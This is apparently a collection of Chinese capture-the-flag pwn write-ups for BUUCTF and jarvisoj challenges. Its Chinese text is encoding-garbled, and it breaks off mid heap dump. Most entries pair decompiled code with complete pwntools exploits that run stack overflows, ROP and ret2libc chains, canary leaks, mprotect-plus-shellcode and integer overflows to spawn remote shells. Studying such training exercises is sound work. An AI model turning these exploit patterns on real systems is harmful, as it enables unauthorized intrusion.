ä¸ºè´Ÿæ•°ï¼Œå°±å¯ä»¥flagç»“æœä¿®æ”¹ä¸ºæ­£ç¡®çš„flagç»“æœï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡åé¢çš„æ£€æµ‹äº† is_flag_correct -&gt; stack 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455-00000000000001A0-00000000000001A0 db ? ; undefined-000000000000019F db ? ; undefined-000000000000019E db ? ; undefined-000000000000019D db ? ; undefined-000000000000019C db ? ; undefined-000000000000019B db ? ; undefined-000000000000019A db ? ; undefined-0000000000000199 db ? ; undefined-0000000000000198 flag_hex dq ? ; offset-0000000000000190 given_flag db 50 dup(?)-000000000000015E db ? ; undefined-000000000000015D db ? ; undefined-000000000000015C db ? ; undefined-000000000000015B db ? ; undefined-000000000000015A db ? ; undefined-0000000000000159 db ? ; undefined-0000000000000158 db ? ; undefined-0000000000000157 db ? ; undefined-0000000000000156 db ? ; undefined-0000000000000155 db ? ; undefined-0000000000000154 db ? ; undefined-0000000000000153 db ? ; undefined-0000000000000152 db ? ; undefined-0000000000000151 db ? ; undefined-0000000000000150 flag db 50 dup(?)-000000000000011E db ? ; undefined-000000000000011D db ? ; undefined-000000000000011C db ? ; undefined-000000000000011B db ? ; undefined-000000000000011A db ? ; undefined-0000000000000119 db ? ; undefined-0000000000000118 db ? ; undefined-0000000000000117 db ? ; undefined-0000000000000116 db ? ; undefined-0000000000000115 db ? ; undefined-0000000000000114 db ? ; undefined-0000000000000113 db ? ; undefined-0000000000000112 db ? ; undefined-0000000000000111 db ? ; undefined-0000000000000110 bin_by_hex db 256 dup(?)-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E value2 db ?-000000000000000D value1 db ?-000000000000000C i_0 dd ?-0000000000000008 db ? ; undefined-0000000000000007 db ? ; undefined-0000000000000006 db ? ; undefined-0000000000000005 diff db ?-0000000000000004 i dd ?+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables charçš„èŒƒå›´ä¸€èˆ¬æ˜¯0~255ï¼Œè¿™é‡Œæœ‰æ•´æ•°æº¢å‡ºï¼Œ190+âˆ£âˆ’66âˆ£=256190+|-66|=256190+âˆ£âˆ’66âˆ£=256ï¼Œè¿™ç§éƒ½è¡Œ 1234payload = &#x27;&#x27;for i in range(50): payload += &#x27;0&#x27; payload += p8(0x100-0x40 + i) è¿™æ ·çš„payloadå°±å¯ä»¥é€šè¿‡æ£€æµ‹äº†ï¼Œç„¶åé€å­—èŠ‚çˆ†ç ´ 1234567891011121314sh = remote(&#x27;node3.buuoj.cn&#x27;,26493)flag = &#x27;&#x27;for i in range(1,51): print &quot;guess the index &#123;&#125;&#x27;s char&quot;.format(i) for c in range(32,128): pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:] sh.sendlineafter(&#x27;guess&gt; &#x27;,pay) ans = sh.recvuntil(&#x27;\\n&#x27;) if &#x27;Yaaaay!&#x27; in ans: flag += chr(c) break print &#x27;flag=&#x27;,flag sh.close() 3.EXP 12345678910111213141516171819202122from pwn import *#bypasspayload = &#x27;&#x27;for i in range(50): payload += &#x27;0&#x27; payload += p8(0x100-0x40 + i) #exploitsh = remote(&#x27;node3.buuoj.cn&#x27;,26493)flag = &#x27;&#x27;for i in range(1,51): print &quot;guess the index &#123;&#125;&#x27;s char&quot;.format(i) for c in range(32,128): pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:] sh.sendlineafter(&#x27;guess&gt; &#x27;,pay) ans = sh.recvuntil(&#x27;\\n&#x27;) if &#x27;Yaaaay!&#x27; in ans: flag += chr(c) break print &#x27;flag&gt;&#x27;,flagsh.close() jarvisoj_typo 1.checksec Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) å‘ç°æ˜¯armæ¶æ„çš„pwn jarvisoj_level0 ç¯å¢ƒï¼šUbuntu16 1.checksec 123456[*] &#x27;/home/o Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; write(1, &quot;Hello, World\\n&quot;, 0xDuLL); return vulnerable_function(1LL, &quot;Hello, World\\n&quot;);&#125; vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL);&#125; ç®€å•æº¢å‡ºï¼Œä¸”å«æœ‰system binsh 3.EXP 1234567from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28704)binsh = 0x040059Apayload = &#x27;a&#x27;*0x88 + p64(binsh)p.sendlineafter(&quot;\\n&quot;,payload)p.interactive() jarvisoj_level2 ç¯å¢ƒï¼šUbuntuï¼š16 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); system(&quot;echo &#x27;Hello World!&#x27;&quot;); return 0;&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] system(&quot;echo Input:&quot;); return read(0, &amp;buf, 0x100u);&#125; æœ‰systemå’Œbinsh 3.EXP 12345678910111213from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26265)#p= process(&quot;./level2&quot;)sys_addr = 0x0804845Cbinsh = 0x0804A024payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr) + p32(binsh)p.sendlineafter(&quot;:&quot;,payload)p.interactive() systemåªèƒ½é€‰å–å·²ç»æ‰§è¡Œè¿‡çš„system jarvisoj_level3 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, &quot;Input:\\n&quot;, 7u); return read(0, &amp;buf, 0x100u);&#125; æ ˆæº¢å‡ºï¼Œéœ€è¦æ‰¾åˆ°libc 3.EXP 12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26281)elf = ELF(&quot;./level3&quot;)libc_start = elf.sym[&quot;__libc_start_main&quot;]libc_start_got = elf.got[&quot;__libc_start_main&quot;]write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]start_addr = 0x08048350p1 = &#x27;a&#x27;*0x88+&#x27;aaaa&#x27;p1 += p32(write_plt)+p32(start_addr)p1 += p32(1)+p32(write_got)+p32(4)p.sendlineafter(&quot;:\\n&quot;,p1)write_real = u32(p.recv(4))libc = LibcSearcher(&quot;write&quot;,write_real)libc_base = write_real - libc.dump(&quot;write&quot;)print &quot;libc_base=&gt;&quot;+hex(libc_base)sys_addr = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)p1 = &#x27;a&#x27;*(0x88+4)p1 += p32(sys_addr)+p32(0)+p32(binsh)p.sendlineafter(&quot;:\\n&quot;,p1)p.interactive() jarvisoj_level3_x64 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; read æº¢å‡º+libc_leak 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,27722)elf = ELF(&quot;./level3_x64&quot;)read_got = elf.got[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]vuln_addr = elf.sym[&quot;vulnerable_function&quot;]pop_rdi_ret = 0x04006b3pop_rsi_r15_ret = 0x04006b1pop_rbp_ret = 0x0400550&#x27;&#x27;&#x27;0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop r14 ; pop r15 ; ret0x00000000004006b2 : pop r15 ; ret0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400550 : pop rbp ; ret0x00000000004006b3 : pop rdi ; ret0x00000000004006b1 : pop rsi ; pop r15 ; ret0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400499 : ret&#x27;&#x27;&#x27;payload = &#x27;a&#x27;*(0x80+8)payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)payload += p64(write_plt)+p64(vuln_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)read_real = u64(p.recv(8))libc = LibcSearcher(&quot;read&quot;,read_real)libc_base = read_real - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.info(&quot;libc base==&gt;%s&quot;,hex(libc_base))log.info(&quot;system addr==&gt;%s&quot;,hex(sys_addr))log.info(&quot;/bin/sh addr==&gt;%s&quot;,hex(binsh))payload = &#x27;a&#x27;*(0x80+8)payload += p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)+p64(vuln_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)p.interactive() jarvisoj_level4 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; è¿™é¢˜æœ¬æ„æ˜¯ç„¶å¤§å®¶ç”¨Dyneflæ¥æ³„éœ²libcçš„ï¼Œä½†æ˜¯LibcSearcherä¸€æ ·å¯ä»¥ 3.EXP 3.1 libcsearcher 12345678910111213141516171819202122232425262728from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28393)elf = ELF(&quot;./level4&quot;)libc_start_main = elf.got[&quot;__libc_start_main&quot;]write_plt = elf.plt[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]payload = &#x27;a&#x27;*(0x88+4)payload += p32(write_plt)+p32(main_addr)+p32(1)+p32(libc_start_main)p.sendline(payload)libc_start_real = u32(p.recv(4))libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_real)libc_base = libc_start_real - libc.dump(&quot;__libc_start_main&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.info(&quot;libc base=&gt;%s&quot;,hex(libc_base))log.info(&quot;system addr=&gt;%s&quot;,hex(sys_addr))log.info(&quot;binsh addr=&gt;%s&quot;,hex(binsh))payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr)+p32(0xdeadbeef)+p32(binsh)p.sendline(payload)p.interactive() 3.2 Dynelf 12345678910111213141516171819202122from pwn import *io=remote(&quot;node3.buuoj.cn&quot;,28393)elf=ELF(&quot;./level4&quot;)vulner_function_address=0x804844Bwrite_plt=elf.plt[&quot;write&quot;]read_plt=elf.plt[&quot;read&quot;]bss_addr=0x0804a024def leak(address): payload=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(write_plt)+p32(vulner_function_address)+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;)) return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;./level4&quot;))sys_addr=d.lookup(&quot;system&quot;,&quot;libc&quot;)print hex(sys_addr)payload1=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(read_plt)+p32(vulner_function_address)+p32(1)+p32(bss_addr)+p32(8)io.sendline(payload1)io.sendline(&quot;/bin/sh&quot;)payload2=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(sys_addr)+p32(vulner_function_address)+p32(bss_addr)io.sendline(payload2)io.interactive() jarvisoj_level5 buuä¸Šç»™çš„å°±æ˜¯jarvisoj_level3_x64 jarvisoj_tell_me_something 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+0h] [rbp-88h] write(1, &quot;Input your message:\\n&quot;, 0x14uLL); read(0, &amp;v4, 0x100uLL); return write(1, &quot;I have received your message, Thank you!\\n&quot;, 0x29uLL);&#125; good_game 1234567891011121314151617int good_game()&#123; FILE *v0; // rbx int result; // eax char buf; // [rsp+Fh] [rbp-9h] v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;); while ( 1 ) &#123; result = fgetc(v0); buf = result; if ( (_BYTE)result == -1 ) break; write(1, &amp;buf, 1uLL); &#125; return result;&#125; è‡ªè¡Œè¯»å–flagï¼Œä¸å«Œéº»çƒ¦ä¹Ÿå¯è¯•è¯•open/read/write 3.EXP 12345678910from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29781)elf = ELF(&quot;./guestbook&quot;)payload = &#x27;a&#x27;*0x88 + p64(0x0400620)p.recvuntil(&quot;message:&quot;)p.sendline(payload)print p.recv()p.interactive() jarvisoj_test_your_memory 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax char s2[11]; // [esp+1Dh] [ebp-13h] int v6; // [esp+28h] [ebp-8h] int i; // [esp+2Ch] [ebp-4h] v6 = 10; puts(&quot;\\n\\n\\n------Test Your Memory!-------\\n&quot;); v3 = time(0); srand(v3); for ( i = 0; i &lt; v6; ++i ) s2[i] = alphanum_2626[rand() % 0x3Eu]; printf(&quot;%s&quot;, s2); mem_test(s2); return 0;&#125;//.rodata:08048860 alphanum_2626 db 30h ; DATA XREF: main+5Fâ†‘r//.rodata:08048861 a123456789abcde db &#x27;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;,0 äº§ç”Ÿéšæœºæ•°ï¼Œç„¶åè®©æˆ‘ä»¬æ¥çŒœ mem_test 12345678910111213141516171819int __cdecl mem_test(char *s2)&#123; int result; // eax char s; // [esp+15h] [ebp-13h] memset(&amp;s, 0, 0xBu); puts(&quot;\\nwhat???? : &quot;); printf(&quot;0x%x \\n&quot;, hint); puts(&quot;cff flag go go go ...\\n&quot;); printf(&quot;&gt; &quot;); __isoc99_scanf(&quot;%s&quot;, &amp;s); if ( !strncmp(&amp;s, s2, 4u) ) result = puts(&quot;good job!!\\n&quot;); else result = puts(&quot;cff flag is failed!!\\n&quot;); return result;&#125;//.data:0804A040 hint dd offset aCatFlag ; DATA XREF: mem_test+2Dâ†‘r//.data:0804A040 _data ends ; &quot;cat flag&quot; éªŒè¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œå¹¶ä¸”æœ‰äº†æ ˆæº¢å‡ºå’Œcat flagçš„åœ°å€ win_func 1234int __cdecl win_func(char *command)&#123; return system(command);&#125; åé—¨å‡½æ•°ï¼Œä½œç”¨==system 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28178)elf = ELF(&quot;./memory&quot;)cat_flag = 0x80487e0payload = &#x27;a&#x27;*(0x13+4)payload += p32(elf.sym[&quot;win_func&quot;])+p32(cat_flag)payload += p32(cat_flag)p.sendline(payload)p.interactive() not_the_same_3dctf_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+Fh] [ebp-2Dh] printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;); gets(&amp;v4); return 0;&#125; ç®€å•æ ˆæº¢å‡ºï¼Œä½†æ˜¯è¿œç¨‹å¼€å¯äº†æ®µä¿æŠ¤ï¼Œæ‰€ä»¥ç”¨ROPå–æ¶ˆæ®µä¿æŠ¤ 3.EXP 123456789101112131415from pwn import *p=process(&#x27;./not_the_same_3dsctf_2016&#x27;)p = remote(&quot;node3.buuoj.cn&quot;,28930)elf=ELF(&#x27;./not_the_same_3dsctf_2016&#x27;)payload=&#x27;a&#x27;*0x2d+p32(elf.symbols[&#x27;mprotect&#x27;])payload+=p32(0x0809e3e5)payload+=p32(0x080EB000)payload+=p32(0x1000)+p32(0x7)payload+=p32(elf.symbols[&#x27;read&#x27;])payload+=p32(0x0809e3e5)+p32(0)+p32(0x080EBF80)+p32(0x100)+p32(0x080EBF80)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() others_babystack 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA ä¸¤ä¸ªä¸»è¦åŠŸèƒ½ 123456def store(text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendline(text)def Print(): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) main 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax char s; // [rsp+10h] [rbp-90h] unsigned __int64 v6; // [rsp+98h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(&amp;s, 0, 0x80uLL); while ( 1 ) &#123; menu(); v3 = READ(); switch ( v3 ) &#123; case 2: puts(&amp;s); break; case 3: return 0LL; case 1: read(0, &amp;s, 0x100uLL); break; default: PUTS(&quot;invalid choice&quot;); break; &#125; PUTS((const char *)&amp;unk_400AE7); &#125;&#125; 24è¡Œçš„readæœ‰ä¸€ä¸ªçŸ­å°çš„æº¢å‡ºï¼Œä»è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨19è¡Œçš„putså¯ä»¥æ³„éœ²canaryçš„å€¼ï¼Œä¸ºä¹‹åæ›´é•¿çš„rop-chainåšå‡†å¤‡ 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;babystack&quot;)#p = process(&quot;./babystack&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28311&quot;)def store(text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendline(text)def Print(): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)pop_rdi_ret = 0x0400a93puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main = 0x0400908if __name__ == &#x27;__main__&#x27;: store(&#x27;a&#x27;*0x88) Print() p.recvuntil(&#x27;a\\n&#x27;) canary=u64(p.recv(7).rjust(8,&#x27;\\x00&#x27;)) log.success(&quot;canary =&gt;0x%x&quot;,canary) payload = &#x27;a&#x27;*0x88+p64(canary)+&#x27;b&#x27;*8 payload += p64(pop_rdi_ret)+p64(puts_got) payload += p64(puts_plt)+p64(main) store(payload) p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) p.recv() puts_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;)) libc = LibcSearcher(&quot;puts&quot;,puts_addr) base = puts_addr-libc.dump(&quot;puts&quot;) sys_addr = libc.dump(&quot;system&quot;)+base binsh = libc.dump(&quot;str_bin_sh&quot;)+base log.success(&quot;puts real =&gt;0x%x&quot;,puts_addr) log.success(&quot;libc base =&gt;0x%x&quot;,base) log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr) log.success(&quot;/bin/sh =&gt;0x%x&quot;,binsh) payload = &#x27;a&#x27;*0x88+p64(canary)+&#x27;b&#x27;*8 payload += p64(pop_rdi_ret)+p64(binsh) payload += p64(sys_addr) store(payload) p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) p.interactive() others_shellcode è¿ä¸Šå°±æœ‰ pwn1_sctf_2016 1.checsec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vuln(); return 0;&#125; vuln 12345678910111213141516171819202122232425262728int vuln()&#123; const char *v0; // eax char s; // [esp+1Ch] [ebp-3Ch] char v3; // [esp+3Ch] [ebp-1Ch] char v4; // [esp+40h] [ebp-18h] char v5; // [esp+47h] [ebp-11h] char v6; // [esp+48h] [ebp-10h] char v7; // [esp+4Fh] [ebp-9h] printf(&quot;Tell me something about yourself: &quot;); fgets(&amp;s, 32, edata); std::string::operator=(&amp;input, &amp;s); std::allocator&lt;char&gt;::allocator(&amp;v5); std::string::string(&amp;v4, &quot;you&quot;, &amp;v5); std::allocator&lt;char&gt;::allocator(&amp;v7); std::string::string(&amp;v6, &quot;I&quot;, &amp;v7); replace((std::string *)&amp;v3); std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4); std::string::~string((std::string *)&amp;v3); std::string::~string((std::string *)&amp;v6); std::allocator&lt;char&gt;::~allocator(&amp;v7); std::string::~string((std::string *)&amp;v4); std::allocator&lt;char&gt;::~allocator(&amp;v5); v0 = (const char *)std::string::c_str((std::string *)&amp;input); strcpy(&amp;s, v0); return printf(&quot;So, %s\\n&quot;, &amp;s);&#125; string 123456789101112131415161718192021LOAD:08048154 00000013 C /lib/ld-linux.so.2............. ........ . ..........LOAD:080488F4 00000007 C strcpyLOAD:080488FB 00000006 C stdinLOAD:08048901 00000007 C printfLOAD:08048908 00000006 C fgetsLOAD:0804890E 0000000D C __cxa_atexitLOAD:0804891B 00000007 C systemLOAD:08048922 00000012 C __libc_start_mainLOAD:08048934 00000008 C GCC_3.0LOAD:0804893C 0000000A C GLIBC_2.0LOAD:08048946 0000000C C GLIBC_2.1.3LOAD:08048952 0000000E C GLIBCXX_3.4.5LOAD:08048960 0000000B C CXXABI_1.3LOAD:0804896B 0000000C C GLIBCXX_3.4.rodata:080497F0 0000000D C cat flag.txt.rodata:08049800 00000023 C Tell me something about yourself: .rodata:08049829 00000008 C So, %s\\n.rodata:08049834 0000002A C basic_string::_S_construct null not valid.eh_frame:0804996F 00000005 C ;*2$\\&quot;.eh_frame:0804999D 00000005 C zPLR çœ‹ä¸Šå»ä¸ä¼šæº¢å‡ºï¼Œä½†æ˜¯æŠŠâ€™Iâ€™æ›¿æ¢æˆâ€™youâ€™ï¼Œä½¿å­—ç¬¦ä¸²å˜å¤šï¼Œæ ˆæº¢å‡º 3.EXP 123456789from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,25541)cat_flag = 0x08048F0Dpayload = &#x27;I&#x27;*20 + &#x27;a&#x27;*4 + p64(cat_flag)p.sendline(payload)p.interactive() pwn2_sctf_2016 1.checksec 123456[*] &#x27;/home/o Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 2.IDA vuln 1234567891011121314int vuln()&#123; char nptr; // [esp+1Ch] [ebp-2Ch] int v2; // [esp+3Ch] [ebp-Ch] printf(&quot;How many bytes do you want me to read? &quot;); get_n((int)&amp;nptr, 4u); v2 = atoi(&amp;nptr); if ( v2 &gt; 32 ) return printf(&quot;No! That size (%d) is too large!\\n&quot;, v2); printf(&quot;Ok, sounds good. Give me %u bytes of data!\\n&quot;, v2); get_n((int)&amp;nptr, v2); return printf(&quot;You said: %s\\n&quot;, &amp;nptr);&#125; get_n 1234567891011121314151617181920int __cdecl get_n(int a1, unsigned int a2)&#123; int v2; // eax int result; // eax char v4; // [esp+Bh] [ebp-Dh] unsigned int v5; // [esp+Ch] [ebp-Ch] v5 = 0; while ( 1 ) &#123; v4 = getchar(); if ( !v4 || v4 == 10 || v5 &gt;= a2 ) break; v2 = v5++; *(_BYTE *)(v2 + a1) = v4; &#125; result = a1 + v5; *(_BYTE *)(a1 + v5) = 0; return result;&#125; è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªatoiï¼Œè¾“å…¥-1æ—¶ä¼šè½¬åŒ–ä¸ºéé›¶å‹æ•´æ•°ï¼Œé€ æˆæ•´æ•°æº¢å‡º æ•´æ•°äº†è¿‡åï¼Œå°±å¯ä»¥å†™æ›´å¤šçš„å€¼ï¼Œä»è€Œgetshell æº¢å‡ºè¦è¦†ç›–çš„é‡å¯ä»¥ä»gdbè°ƒè¯•å‡ºæ¥ 3.EXP 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn2_sctf_2016&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)p = remote(&quot;node3.buuoj.cn&quot;,29632)#p = process(&quot;./pwn2_sctf_2016&quot;)start_addr = 0x080483d0output_addr = 0x080486F8vuln_addr = 0x0804852Fprintf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;a&#x27;*48 payload += p32(printf_plt) + p32(start_addr) payload += p32(output_addr) + p32(elf.got[&quot;__libc_start_main&quot;])p.recvuntil(&quot;?&quot;)p.sendline(&quot;-1&quot;)p.recv()p.sendline(flat(payload))p.recvuntil(&quot;You said: &quot;) #ä¸€æ®µæ— æ³•è¾“å‡ºå®Œæ•´p.recvuntil(&quot;You said: &quot;)main_real = u32(p.recv(4))#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,main_real)libcbase = main_real - libc.sym[&quot;__libc_start_main&quot;]sys_addr = libcbase + libc.sym[&#x27;system&#x27;]binsh = libcbase + libc.search(&quot;/bin/sh\\x00&quot;).next()payload = &#x27;a&#x27;*48 + p32(sys_addr)+p32(output_addr) + p32(binsh)p.recvuntil(&quot;?&quot;)p.sendline(&quot;-1&quot;)p.recvuntil(&quot;!&quot;)p.sendline(payload)p.interactive() pwnable_hack_note 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA åŸºæœ¬åŠŸèƒ½å¦‚ä¸‹ 1234567891011121314151617def add(size, content): p.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;) p.recvuntil(&quot;Note size :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def delete(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) def show(index): p.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;) p.recvuntil(&quot;Index :&quot;) p.sendline(str(index)) delete 123456if ( ptr[v1] ) &#123; free(*((void **)ptr[v1] + 1)); free(ptr[v1]); puts(&quot;Success&quot;); &#125; æŒ‡é’ˆæ²¡æœ‰å½’é›¶ 3.GDB 0x1 å…ˆç”³è¯·ä¸€ä¸ªchunk 1234567891011121314151617181920212223242526272829pwndbg&gt; heap0x804b000 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x804862b, bk = 0x804b018, fd_nextsize = 0x0, bk_nextsize = 0x11&#125;0x804b010 FASTBIN &#123; prev_size = 0, size = 17, fd = 0x61616161, bk = 0xa, fd_nextsize = 0x0, bk_nextsize = 0x20fe1&#125;0x804b020 PREV_INUSE &#123; prev_size = 0, size = 135137, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x804b000: 0x00000000 0x00000011 0x0804862b 0x0804b0180x804b010: 0x00000000 0x00000011 0x61616161 0x0000000a0x804b020: 0x00000000 0x00020fe1 0x00000000 0x000000000x804b030: 0x00000000 0x00000000 0x00000000 0x00000000 0x2 æŸ¥çœ‹0x0804862bå’Œ0x0804b018 0x0804862b 1234int __cdecl sub_804862B(int a1)&#123; return puts(*(const char **)(a1 + 4));&#125; 0x0804b018 è¯¥åœ°å€åº”è¯¥æ˜¯ç»‘å®šçš„åˆ†é…å †çš„åœ°å€ï¼Œåˆ°æ—¶å€™ä¿®è¡¥ä¸Šå°±è¡Œ 4.æ€è·¯ uafï¼Œå°†0x0804862bæ”¹ä¸ºä¸€ä¸ªæˆ‘ä»¬èƒ½æ³„éœ²çš„å‡½æ•° è®¡ç®—systemçš„ç›¸å¯¹ä½ç½® æ”¹0x0804862bä¸ºsystemï¼Œå¹¶ä¼ å…¥sh\\x00\\x00 è°ƒç”¨åŸæ¥çš„è¾“å‡ºå‡½æ•°ï¼Œè¾“å‡ºçš„å¯¹è±¡æ˜¯åˆšæ‰å¡«å…¥çš„sh\\x00\\x00 ä¼ªé€ è¿‡å 1234560x860b000: 0x00000000 0x00000011 0x0804862b 0x0860b0300x860b010: 0x00000000 